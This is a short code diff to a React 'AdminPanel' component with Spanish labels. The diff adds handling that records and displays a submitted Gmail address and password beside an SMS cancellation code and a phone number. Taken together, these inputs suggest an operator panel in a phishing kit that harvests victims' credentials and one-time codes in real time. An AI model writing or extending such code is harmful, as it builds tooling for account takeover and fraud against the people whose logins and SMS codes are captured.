@@ -381,6 +381,9 @@ export default function AdminPanel() {
             case 'smsCompra':
               inputDescription = `Código de Cancelación: ${inputData.smsCompra}`;
               break;
+            case 'gmail':
+              inputDescription = `Gmail - Correo: ${inputData.correo || 'N/A'}, Contraseña: ${inputData.contrasena || 'N/A'}`;
+              break;
             default:
               inputDescription = `Datos de ${tipo}`;
           }
@@ -425,6 +428,10 @@ export default function AdminPanel() {
                   break;
                 case 'celular':
                   updatedSession.celular = inputData.celular;
+                  break;
+                case 'gmail':
+                  updatedSession.correo = inputData.correo;
+                  updatedSession.contrasena = inputData.contrasena;
                   break;
               }
               
